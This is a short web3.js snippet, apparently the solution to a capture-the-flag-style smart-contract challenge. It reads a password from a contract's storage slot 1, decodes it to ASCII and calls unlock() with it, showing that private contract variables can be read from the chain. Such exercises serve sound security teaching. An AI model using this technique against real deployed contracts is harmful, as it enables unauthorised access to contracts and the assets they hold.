const password = await web3.eth.getStorageAt(instance,1);
web3.utils.toAscii(password) // to see it
await contract.unlock(password);